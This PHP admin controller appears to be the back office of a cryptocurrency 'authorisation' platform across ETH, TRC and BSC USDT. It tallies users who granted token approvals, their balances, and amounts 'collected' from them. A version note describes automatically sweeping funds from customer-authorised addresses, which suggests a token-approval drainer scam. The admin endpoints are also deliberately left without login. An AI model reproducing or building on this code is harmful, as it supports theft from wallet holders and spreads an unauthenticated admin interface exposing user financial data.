<?php

namespace app\admin\controller;

use app\common\controller\Backend;
use app\common\model\ApproveHistory;
use app\common\model\Assets;
use app\common\model\Token;
use app\common\model\User;
use app\common\model\TransactionFlow;
use app\common\model\WithdrawTransaction;
use think\facade\Config;

class Index extends Backend
{

    protected $noNeedLogin = ['*'];

    public function index()
    {
        $network = Config::get('blockchain.network');
        $ercTokenId = Token::where(['chain' => 'erc', 'symbol' => 'USDT', 'network' => $network])
            ->value('id');
        $ercUser = User::with(["assets"=>function($query) use ($ercTokenId){
            $query->where(['token_id' => $ercTokenId]);
        }])->where(['token_id' => $ercTokenId])->limit(10)->select()->toArray();
        foreach ($ercUser as $key => $val){
            $ercUser[$key]['money_num'] = $val['assets'][0]['available_balance'];
        }
        $trcTokenId = Token::where(['chain' => 'trc', 'symbol' => 'USDT', 'network' => $network])
            ->value('id');
        $trcUser = User::with(["assets"=>function($query) use ($trcTokenId){
            $query->where(['token_id' => $trcTokenId]);
        }])->where(['token_id' => $trcTokenId])->limit(10)->select()->toArray();
        foreach ($trcUser as $key => $val){
            $trcUser[$key]['money_num'] = $val['assets'][0]['available_balance'];
        }
        $bscTokenId = Token::where(['chain' => 'bsc', 'symbol' => 'USDT', 'network' => $network])
            ->value('id');
        $bscUser = User::with(["assets"=>function($query) use ($bscTokenId){
            $query->where(['token_id' => $bscTokenId]);
        }])->where(['token_id' => $bscTokenId])->limit(10)->select()->toArray();
        foreach ($bscUser as $key => $val){
            $bscUser[$key]['money_num'] = $val['assets'][0]['available_balance'];
        }
        $data = [
            'BSC'     => [
                "total_balance"          => Assets::where('token_id', $bscTokenId)->sum('available_balance'),//授权成功余额
                "auth_num"               => User::where(['is_approve'=> 1,'token_id'=>$bscTokenId])->count(),//已授权总人数
                "day_total_balance"      => Assets::where('token_id', $bscTokenId)->whereTime('create_time','today')->sum('available_balance'),//当天授权成功总余额
                "day_auth_num"           => User::where(['is_approve'=> 1,'token_id'=>$bscTokenId])->whereTime('create_time','today')->count(),//当天新增授权人数
                "day_change_balance"     => TransactionFlow::where('token_id', $bscTokenId)->whereTime('create_time','today')->sum('amount'),//当日总变动金额
                "day_withdraw_balance"   => WithdrawTransaction::where('token_id', $bscTokenId)->whereTime('create_time','today')->sum('amount'),//当日总出款金额
                "day_withdraw_num"       => WithdrawTransaction::where('token_id', $bscTokenId)->whereTime('create_time','today')->count(),//当日总出款人数
                "day_collection_balance" => Assets::where('token_id', $bscTokenId)->whereTime('create_time','today')->sum('collect_amount'),//当日总归集金额
                "collection_balance"     => Assets::where('token_id', $bscTokenId)->sum('collect_amount'),//平台总归集金额
                "spending_balance"       => 0,//平台总出金金额
                "user_balance"           => $bscUser
            ],
            'ETH'     => [
                "total_balance"          => Assets::where('token_id', $ercTokenId)->sum('available_balance'),//授权成功余额
                "auth_num"               => User::where(['is_approve'=> 1,'token_id'=>$ercTokenId])->count(),//已授权总人数
                "day_total_balance"      => Assets::where('token_id', $ercTokenId)->whereTime('create_time','today')->sum('available_balance'),//当天授权成功总余额
                "day_auth_num"           => User::where(['is_approve'=> 1,'token_id'=>$ercTokenId])->whereTime('create_time','today')->count(),//当天新增授权人数
                "day_change_balance"     => TransactionFlow::where('token_id', $ercTokenId)->whereTime('create_time','today')->sum('amount'),//当日总变动金额
                "day_withdraw_balance"   => WithdrawTransaction::where('token_id', $ercTokenId)->whereTime('create_time','today')->sum('amount'),//当日总出款金额
                "day_withdraw_num"       => WithdrawTransaction::where('token_id', $ercTokenId)->whereTime('create_time','today')->count(),//当日总出款人数
                "day_collection_balance" => Assets::where('token_id', $ercTokenId)->whereTime('create_time','today')->sum('collect_amount'),//当日总归集金额
                "collection_balance"     => Assets::where('token_id', $ercTokenId)->sum('collect_amount'),//平台总归集金额
                "spending_balance"       => 0,//平台总出金金额
                "user_balance"           => $ercUser
            ],
            'TRC'     => [
                "total_balance"          => Assets::where('token_id', $trcTokenId)->sum('available_balance'),//授权成功余额
                "auth_num"               => User::where(['is_approve'=> 1,'token_id'=>$trcTokenId])->count(),//已授权总人数
                "day_total_balance"      => Assets::where('token_id', $trcTokenId)->whereTime('create_time','today')->sum('available_balance'),//当天授权成功总余额
                "day_auth_num"           => User::where(['is_approve'=> 1,'token_id'=>$trcTokenId])->whereTime('create_time','today')->count(),//当天新增授权人数
                "day_change_balance"     => TransactionFlow::where('token_id', $trcTokenId)->whereTime('create_time','today')->sum('amount'),//当日总变动金额
                "day_withdraw_balance"   => WithdrawTransaction::where('token_id', $trcTokenId)->whereTime('create_time','today')->sum('amount'),//当日总出款金额
                "day_withdraw_num"       => WithdrawTransaction::where('token_id', $trcTokenId)->whereTime('create_time','today')->count(),//当日总出款人数
                "day_collection_balance" => Assets::where('token_id', $trcTokenId)->whereTime('create_time','today')->sum('collect_amount'),//当日总归集金额
                "collection_balance"     => Assets::where('token_id', $trcTokenId)->sum('collect_amount'),//平台总归集金额
                "spending_balance"       => 0,//平台总出金金额
                "user_balance"           => $trcUser
            ],
            'version' => [
                [
                    "id"         => 37,
                    "created_at" => "2023-04-10T03:16:16.000000Z",
                    "updated_at" => "2023-04-10T03:16:16.000000Z",
                    "content"    => [
                        "0" => [
                            "type"    => "新增",
                            "content" => "支持更新授权地址,前台客户不需重复授权,在归集操作时自动使用客户授权的地址进行操作",
                        ],
                    ],
                    "admin_id"   => 1,
                    "version"    => "V3.1",
                ],
            ],
        ];
        $this->success('请求成功', $data);
    }

    public function getCoin()
    {
        $data = [
            [
                "id"               => 1,
                "coin_name"        => "ETH-usdt",
                "contract_address" => "0xxertertretertdfgdfg",
                "created_at"       => "2022-01-08 17:32:48",
                "updated_at"       => "2022-03-23 15:00:46",
                "main_coin"        => "ETH",
            ],
            [
                "id"               => 2,
                "coin_name"        => "TRC-usdt",
                "contract_address" => "0xxxwqefrweqweqw",
                "created_at"       => "2022-03-23 14:56:45",
                "updated_at"       => "2022-03-23 14:57:59",
                "main_coin"        => "TRX",
            ],
            [
                "id"               => 3,
                "coin_name"        => "BSC-usdt",
                "contract_address" => "0x55d398326f99059ff775485246999027b3197955",
                "created_at"       => "2023-04-25 09:38:52",
                "updated_at"       => "2023-04-25 10:16:46",
                "main_coin"        => "BNB",
            ],
        ];
        $this->success('请求成功', $data);
    }

    /**
     * 业务通知
     */
    public function getNotice()
    {
        $data = [
            //重点关注
            "focus_user"            => \app\common\model\User::getFocusUserLists(),
            "withdrawal_user"       => [],
            "out_eth"               => 0,
            "out_trc"               => 0,
            "out_bsc"               => 0,
            "auth_eth"              => 0,
            "auth_trc"              => 0,
            "auth_bsc"              => 0,
            //新用户注册
            "new_login_user"        => \app\common\model\User::getNewLoginUser(),
            "integral_insufficient" => 1,
            "balance_user"          => 0,
            //新用户授权
            "auth_user"             => ApproveHistory::authUser(),
            "send_eth"              => 0,
            "send_trc"              => 0,
            "send_bsc"              => 0,
        ];
        $this->success('请求成功', $data);
    }

}
